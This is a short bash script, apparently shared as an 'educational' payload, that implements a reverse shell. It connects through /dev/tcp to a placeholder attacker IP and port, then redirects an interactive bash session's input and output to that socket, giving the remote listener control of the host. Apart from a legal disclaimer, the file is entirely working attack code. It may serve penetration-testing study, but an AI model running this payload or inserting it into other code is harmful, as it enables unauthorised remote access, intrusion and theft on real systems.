#!/bin/bash

# Developed by veilwr4ith
# WARNING: This script is intended for educational purposes only. 
# NEVER USE THIS PAYLOAD FOR ILLEGAL ACTIVITIES. Unauthorized use 
# of this script can result in serious legal consequences. Use 
# responsibly and only in environments where you have explicit permission.

# Replace with your attacker's IP address and port
ATTACKER_IP="127.0.0.1" # Replace with the attacker's IP address
ATTACKER_PORT="1234" # Replace with the attacker's port number

# Establish a connection to the attacker's server
exec 5<>/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT

# Redirect stdin, stdout, and stderr to the socket, opening an interactive bash shell
bash -i <&5 >&5 2>&5

